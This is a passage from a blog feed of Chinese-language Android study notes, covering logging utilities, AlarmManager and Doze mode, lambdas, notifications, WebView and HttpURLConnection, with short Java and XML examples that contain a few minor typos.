class="number">6</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> in level = VERBOSE;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">v</span><span class="params">(String tag, String msg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(level &lt;= VERBOSE)&#123;</span><br><span class="line">            Log.v(tag, msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">d</span><span class="params">(String tag, String msg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(level &lt;= DEBUG)&#123;</span><br><span class="line">            Log.d(tag, msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">i</span><span class="params">(String tag, String msg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(level &lt;= INFO)&#123;</span><br><span class="line">            Log.i(tag, msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">w</span><span class="params">(String tag, String msg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(level &lt;= WARN)&#123;</span><br><span class="line">            Log.w(tag, msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">e</span><span class="params">(String tag, String msg)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(level &lt;= ERROR)&#123;</span><br><span class="line">            Log.e(tag, msg);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如打印日志DEBUG时时可以这样写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LogUtil.d(<span class="string">"TAG"</span>, <span class="string">"debug log"</span>);</span><br></pre></td></tr></table></figure><p>这样，当正式发布时只需要将level值修改为NOTHING就不会显示任何日志了。</p><h2 id="调试Android程序"><a href="#调试Android程序" class="headerlink" title="调试Android程序"></a>调试Android程序</h2><h2 id="创建定时任务"><a href="#创建定时任务" class="headerlink" title="创建定时任务"></a>创建定时任务</h2><p>Android的定时任务一般有两种实现方式：Java API里提供的Timer类和Android的Alarm机制。而Timer不适用与需要长期在后台运行的定时任务。这是因为Android长时间不操作时CPU会进入睡眠状态，Alarm则具有唤醒CPU的功能。</p><h3 id="Alarm机制"><a href="#Alarm机制" class="headerlink" title="Alarm机制"></a>Alarm机制</h3><p>主要是借助AlarmManager类来实现的。</p><p>获取一个AlarmManager实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AlarmManage manager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);</span><br></pre></td></tr></table></figure><p>接下来调用set()方法即可，比如要设置在10秒后执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> triggerAtTime = SystemClock.elapsedRealtime() + <span class="number">10</span> * <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line">manager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, pendingIntent);</span><br></pre></td></tr></table></figure><p>set()方法第一个参数是整型参数，用于指定工作类型：ELAPSED_REALTIME（表示让定时任务的触发时间从系统开机开始算起，但不会唤醒CPU）、ELAPSED_REALTIME_WAKEUP（表示让定时任务的触发时间从系统开机开始算起，但会唤醒CPU）、RTC（表示让定时任务的触发时间从1970年1月1日0点开始算起，但不会唤醒CPU）和RTC_WAKEUP（表示让定时任务的触发时间从1970年1月1日0点开始算起，但会唤醒CPU）。第二个参数是定时任务触发时间。第三个参数是PendingIntent，这里一般会调用getService()方法或getBroadcast()方法来获取一个能够执行服务或广播的PendingIntent。</p><p>SystemClock.elapsedRealtime()方法用于获取系统开机至今所经历时间的毫秒数。</p><p>SystemClock.currentTimeMillis()方法用于获取从1970年1月1日0点至今所经历时间的毫秒数。</p><p>另外需要注意的是，从Android4.4系统开始，Alarm任务的触发时间将会变得不准确，因为系统会将触发时间相近的几个任务放在一起执行。</p><p>如果必须准确无误的话，使用AlarmManager的setExact()方法替代set()方法即可。</p><h3 id="Doze模式"><a href="#Doze模式" class="headerlink" title="Doze模式"></a>Doze模式</h3><p>当用户的设备是Android6.0或以上系统时，如果该设备为插接电源，处于静止状态（Android7.0中删除了这一条件），且屏幕关闭了一段时间后，就会进入Doze模式。在Doze模式下，系统会对CPU、网络、Alarm等活动进行限制，从而延长电池的使用寿命。</p><p>当然，系统不会一直处于Doze模式，而是会间歇性的退出Doze模式一小段时间，在这段时间中，应用就可以去完成他们的同步操作、Alarm任务等。</p><p><img src="./day8/2.jpg" alt=""></p><p>随着设备进入Doze模式的时间越长，间歇性地退出Doze模式的时间间隔也会越长。</p><p>Doze模式下功能的限制：</p><ul><li>网络访问被禁止。</li><li>系统忽略唤醒CPU或者屏幕操作。</li><li>系统不再执行WIFI扫描。</li><li>系统不再执行同步服务。</li><li>Alarm任务将会在下次退出Doze模式的时候执行。</li></ul><p>AlarmManager的setAndAllowWhileIdle()和setExactAndAllowWhileIdle()方法就能让定时任务在Doze模式下也正常执行，这两个方法间的区别和set()、setExact()方法之间的区别是一样的。</p><h2 id="多窗口模式编程"><a href="#多窗口模式编程" class="headerlink" title="多窗口模式编程"></a>多窗口模式编程</h2><p>Android7.0系统中引入了多窗口模式，它运行我们在同一个屏幕中同时打开两个应用程序。</p><h3 id="多窗口模式下的生命周期"><a href="#多窗口模式下的生命周期" class="headerlink" title="多窗口模式下的生命周期"></a>多窗口模式下的生命周期</h3><p>多窗口模式并不会改变活动原有的生命周期，只是会将用户最近交互过的那个活动设置为运行状态，而多窗口模式下另一个可见的活动设置为暂停状态。</p><h2 id="Lambda表达式"><a href="#Lambda表达式" class="headerlink" title="Lambda表达式"></a>Lambda表达式</h2><p>Lambda表达式本质上是一种匿名方法，即没有方法名，也没有访问修饰符和返回类型。</p><p>首先需要在app/build.gradle中添加如下配置：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">...</span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        ...</span><br><span class="line">        jackOptions.enabled = <span class="keyword">true</span></span><br><span class="line">    &#125;</span><br><span class="line">complieOptions&#123;</span><br><span class="line"><span class="keyword">sourceCompatibility</span> JavaVersion.VERSION_1_8</span><br><span class="line"><span class="keyword">targetCompatibility</span> JavaVersion.VERSION_1_8</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后就可以使用Lambda表达式了，比如开启子线程可以写成：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">    <span class="comment">//pass</span></span><br><span class="line">&#125;).start();</span><br></pre></td></tr></table></figure><p>凡是只有一个待实现方法的接口，都可以使用Lambda表达式的写法。</p><p>另外一种对于含参数的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MyListener</span></span>&#123;</span><br><span class="line"><span class="function">String <span class="title">doSomething</span><span class="params">(String a, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于这一的，Lambda表达可以这样写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MyListener listener = (String a, <span class="keyword">int</span> b) -&gt;&#123;</span><br><span class="line">String result = a + b;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>另外Java还可以根据上下文自动推断出Lambda表达式中的参数类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MyListener listener = (a, b) -&gt; &#123;</span><br><span class="line">String result = a + b;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接下来再举个例子，比如现在有一个方法是接收Mylistener参数的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hello</span><span class="params">(MyListener listener)</span> </span>&#123;</span><br><span class="line">    String a = <span class="string">"Hello Lambda"</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">1024</span>;</span><br><span class="line">    String result = listener.doSomething(a, b);</span><br><span class="line">    Log.d(<span class="string">"TAG"</span>, result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么在调用hello()这个方法的时候可以这样写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hello((a, b) -&gt; &#123;</span><br><span class="line">    String result = a + b;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;探究服务&quot;&gt;&lt;a href=&quot;#探究服务&quot; class=&quot;headerlink&quot; title=&quot;探究服务&quot;&gt;&lt;/a&gt;探究服务&lt;/h1&gt;&lt;h2 id=&quot;什么是服务&quot;&gt;&lt;a href=&quot;#什么是服务&quot; class=&quot;headerlink&quot; title=&quot;什么是服务&quot;&gt;
      
    
    </summary>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/tags/Android/"/>
    
      <category term="开发" scheme="https://nuoye-blog.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Android-day7</title>
    <link href="https://nuoye-blog.github.io/2020/06/02/Android/Android-day7/"/>
    <id>https://nuoye-blog.github.io/2020/06/02/Android/Android-day7/</id>
    <published>2020-06-02T06:40:00.000Z</published>
    <updated>2020-06-02T06:38:32.778Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>多媒体这块感觉也是不太需要，快速略过，了解下就行。</p><h1 id="多媒体的运用"><a href="#多媒体的运用" class="headerlink" title="多媒体的运用"></a>多媒体的运用</h1><h2 id="使用通知"><a href="#使用通知" class="headerlink" title="使用通知"></a>使用通知</h2><p>通知是Android系统中的一个功能，当某个应用程序希望向用户发出一些提示消息，而该应用程序又不在前台运行时，就可以借助通知来实现。</p><h3 id="通知的基本用法"><a href="#通知的基本用法" class="headerlink" title="通知的基本用法"></a>通知的基本用法</h3><p>通知即可以在活动里创建，也可以在广播接收器里创建，当然也可以在服务里创建。</p><h4 id="创建通知"><a href="#创建通知" class="headerlink" title="创建通知"></a>创建通知</h4><p>首先需要一个NotificationManager来对通知进行管理，可以调用Context的getSystemService()方法获取到。getSystemService()方法接收到一个字符串参数用于确定获取系统的哪个服务（这里我们传入Context.NOTIFICATION_SERVICE即可）。因此，获取NotificationManager的实例就可以写成：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NotificationManager manager = (NotificationManager) getSyetemService(Context.NOTIFICATION_SERVICE);</span><br></pre></td></tr></table></figure><p>接下来需要使用一个Builder构造器来创建Notification对象，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Notification notification = <span class="keyword">new</span> NotificationCompat.Builder(context).build();</span><br></pre></td></tr></table></figure><p>上面只是一个空的Notification对象，下面来创建一个丰富的Notification对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Notification notification = <span class="keyword">new</span> NotificationCompat.Builder(context)</span><br><span class="line">    .setContentTitle(<span class="string">"This is content title"</span>)<span class="comment">//标题</span></span><br><span class="line">    .setContentText(<span class="string">"This is content Text"</span>)<span class="comment">//通知正文内容</span></span><br><span class="line">    .setWhen(System.currentTimeMillis())<span class="comment">//指定通知创建时间</span></span><br><span class="line">    .setSmallIcon(R.drawable.small_icon)<span class="comment">//设置通知小图标</span></span><br><span class="line">    .setLargeIcon(BitmapFactory.decodeResource(getResource(),</span><br><span class="line">                                              R.drawable.large_icon))<span class="comment">//设置通知大图标，即下拉状态栏后显示的图标</span></span><br><span class="line">    .build();</span><br></pre></td></tr></table></figure><p>接下来只需要调用NotificationManager的notify()方法就可以显示了。它第一个参数的id，第二个参数是Notification对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manager.notify(<span class="number">1</span>, notification);</span><br></pre></td></tr></table></figure><h4 id="实现通知的点击效果"><a href="#实现通知的点击效果" class="headerlink" title="实现通知的点击效果"></a>实现通知的点击效果</h4><p>PendingIntent用于在某个合适的时机去执行某个动作，可以理解为是延迟执行的Intent。</p><p>有几个静态方法可以获取PendingIntent实例：getActivity()、getBroadcast()、getService()。这几个方法的参数都相同，分别是：Context、0（一般用不到）、Intent对象、PendingIntent的行为（有FLAG_ONE_SHOT、FLAG_NO_CREATE、FLAG_CANCEL_CURRENT和FLAG_UPDATE_CURRENT这四种值可选）。</p><p>NotificationCompat对象还可以再连缀一个setContentIntent()方法，其参数正是PendingIntent对象，因此可以加上这一方法从而实现通知的点击效果。</p><p>另外还需连缀.setAutoCancel(true)以达到点击后消息取消的目的。</p><p>在点击消息后创建的活动中调用NotificationManager的cancel()方法取消：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NotificationManager manager &#x3D; (NotificationManager) getSyetemService(Context.NOTIFICATION_SERVICE);</span><br><span class="line">manager.cancel(1);</span><br></pre></td></tr></table></figure><p>其中cancel中的参数1即是上面设置的通知id。</p><h3 id="进阶技巧"><a href="#进阶技巧" class="headerlink" title="进阶技巧"></a>进阶技巧</h3><p>setSound()在通知发出时播放音频。</p><p>setVibrate()在通知发出时振动（需要权限声明）</p><p>setLights(color, light_time,dark_time)在通知时闪烁通知灯，时间以毫秒为单位</p><p>还有更多的技巧可以直接查询相关文档，就不再研究了。</p><h2 id="调用摄像头和相册以及播放多媒体文件"><a href="#调用摄像头和相册以及播放多媒体文件" class="headerlink" title="调用摄像头和相册以及播放多媒体文件"></a>调用摄像头和相册以及播放多媒体文件</h2><p>具体即intent与内容提供器的结合，具体实现过程就不搞了。。。需要的话到时候直接网上copy。</p><h1 id="使用网络技术"><a href="#使用网络技术" class="headerlink" title="使用网络技术"></a>使用网络技术</h1><h2 id="WebView用法"><a href="#WebView用法" class="headerlink" title="WebView用法"></a>WebView用法</h2><p>Android提供了一个WebView空间，可以用于在应用程序中嵌入一个浏览器，从而轻松的展示各种各样的网页。</p><p>新建一个WebView项目，修改布局文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">WebView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/web_view"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后修改代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        WebView webView = (WebView) findViewById(R.id.web_view);</span><br><span class="line">        webView.getSettings().setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">        webView.setWebViewClient(<span class="keyword">new</span> WebViewClient());</span><br><span class="line">        webView.loadUrl(<span class="string">"http://www.baidu.com"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，还需添加访问网络的权限说明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>这样就具备了一个简易的浏览器的功能了。</p><h2 id="使用HTTP协议访问网络"><a href="#使用HTTP协议访问网络" class="headerlink" title="使用HTTP协议访问网络"></a>使用HTTP协议访问网络</h2><h3 id="使用HttpURLConnection"><a href="#使用HttpURLConnection" class="headerlink" title="使用HttpURLConnection"></a>使用HttpURLConnection</h3><p>获取HttpURLConnection实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL url = <span class="keyword">new</span> URL(<span class="string">"http://www.baidu.com"</span>);</span><br><span class="line"><span class="function">HttpURLConnection <span class="title">connection</span> <span class="params">(HttpURLConnection)</span> url.<span class="title">openConnection</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>设置：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">connection.setRequestMethod(<span class="string">"GET);</span></span><br><span class="line"><span class="string">connection.setConnectTimeout(8000);</span></span><br><span class="line"><span class="string">connection.setReadTimeout(8000);</span></span><br></pre></td></tr></table></figure><p>然后获取服务器返回的输入流：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InputStream in = connection.getInputStream();</span><br></pre></td></tr></table></figure><p>关闭HTTP连接：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connection.disconnect();</span><br></pre></td></tr></table></figure><p>下面进行实战，首先修改布局文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/send_request"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"Send Request"</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ScrollView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span> &gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:id</span>=<span class="string">"@+id/response_text"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ScrollView</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后修改代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    TextView responseText;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button sendRequest = (Button) findViewById(R.id.send_request);</span><br><span class="line">        responseText = (TextView) findViewById(R.id.response_text);</span><br><span class="line">        sendRequest.setOnClickListener(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (v.getId() == R.id.send_request)&#123;</span><br><span class="line">            sendRequestWithHttpURLConnection();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequestWithHttpURLConnection</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                HttpURLConnection connection = <span class="keyword">null</span>;</span><br><span class="line">                BufferedReader reader = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    URL url = <span class="keyword">new</span> URL(<span class="string">"http://www.baidu.com"</span>);</span><br><span class="line">                    connection = (HttpURLConnection) url.openConnection();</span><br><span class="line">                    connection.setRequestMethod(<span class="string">"GET"</span>);</span><br><span class="line">                    connection.setConnectTimeout(<span class="number">8000</span>);</span><br><span class="line">                    connection.setReadTimeout(<span class="number">8000</span>);</span><br><span class="line">                    InputStream in = connection.getInputStream();</span><br><span class="line">                    reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">                    StringBuilder response = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        response.append(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                    showResponse(response.toString());</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(reader != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">try</span>&#123;</span><br><span class="line">                            reader.close();</span><br><span class="line">                        &#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (connection != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        connection.disconnect();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">showResponse</span><span class="params">(<span class="keyword">final</span> String response)</span></span>&#123;</span><br><span class="line">        runOnUiThread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                responseText.setText(response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Android不允许在子线程中进行UI操作，runOnUiThread()方法用于将线程切换到主线程，然后再更新UI元素。</p><p>如果想提交数据，可用如下方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">connection.setRequestMethod(<span class="string">"POST"</span>);</span><br><span class="line">DataOutputStream out = <span class="keyword">new</span> DataOutputStream(conncetion.getOutputStream());</span><br><span class="line">out.writeBytes(<span 